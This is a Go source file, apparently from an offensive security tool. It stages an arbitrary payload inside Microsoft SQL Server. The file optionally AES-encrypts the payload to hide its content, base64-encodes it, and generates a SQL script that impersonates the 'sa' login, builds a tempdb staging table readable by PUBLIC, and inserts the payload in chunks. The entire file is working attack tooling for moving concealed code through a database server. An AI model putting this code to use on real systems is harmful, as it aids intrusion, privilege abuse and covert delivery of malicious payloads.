package mssql

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
)

const chunkSize = 8000 // NVARCHAR(MAX) safe per INSERT row

// StagePayload reads the payload at payloadPath, optionally AES-256-CBC encrypts it
// (IV prepended), base64 encodes the result, then writes a SQL script to outPath
// that creates tempdb..stg and INSERTs 8000-char base64 chunks.
// Returns the base64-encoded AES key when encrypt=true, "" otherwise.
func StagePayload(payloadPath, outPath string, encrypt bool) (key string, err error) {
	data, err := os.ReadFile(payloadPath)
	if err != nil {
		return "", fmt.Errorf("read payload: %w", err)
	}

	var blob []byte
	if encrypt {
		rawKey := make([]byte, 32) // AES-256
		if _, err = rand.Read(rawKey); err != nil {
			return "", fmt.Errorf("generate key: %w", err)
		}
		iv := make([]byte, aes.BlockSize)
		if _, err = rand.Read(iv); err != nil {
			return "", fmt.Errorf("generate iv: %w", err)
		}
		// PKCS7 pad
		pad := aes.BlockSize - (len(data) % aes.BlockSize)
		padded := make([]byte, len(data)+pad)
		copy(padded, data)
		for i := len(data); i < len(padded); i++ {
			padded[i] = byte(pad)
		}
		block, _ := aes.NewCipher(rawKey)
		ct := make([]byte, len(padded))
		cipher.NewCBCEncrypter(block, iv).CryptBlocks(ct, padded)
		blob = append(iv, ct...)
		key = base64.StdEncoding.EncodeToString(rawKey)
	} else {
		blob = data
	}

	b64 := base64.StdEncoding.EncodeToString(blob)

	var sb strings.Builder
	sb.WriteString("EXECUTE AS LOGIN='sa';\n")
	sb.WriteString("USE tempdb;\n")
	sb.WriteString("IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;\n")
	sb.WriteString("CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));\n")
	sb.WriteString("GRANT SELECT ON stg TO PUBLIC;\n")
	for i := 0; i < len(b64); i += chunkSize {
		end := i + chunkSize
		if end > len(b64) {
			end = len(b64)
		}
		fmt.Fprintf(&sb, "INSERT INTO stg(chunk) VALUES (N'%s');\n", b64[i:end])
	}

	if err = os.WriteFile(outPath, []byte(sb.String()), 0600); err != nil {
		return "", fmt.Errorf("write sql: %w", err)
	}
	return key, nil
}
